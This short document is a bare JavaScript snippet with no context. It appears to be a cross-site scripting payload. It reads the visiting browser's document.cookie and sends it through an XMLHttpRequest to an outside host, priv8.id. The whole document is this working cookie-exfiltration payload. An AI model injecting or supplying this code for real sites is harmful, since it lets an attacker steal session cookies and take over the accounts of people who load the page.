var x = new XMLHttpRequest();
x.open("GET", "https://priv8.id/?c=" + encodeURIComponent(document.cookie));
x.send();
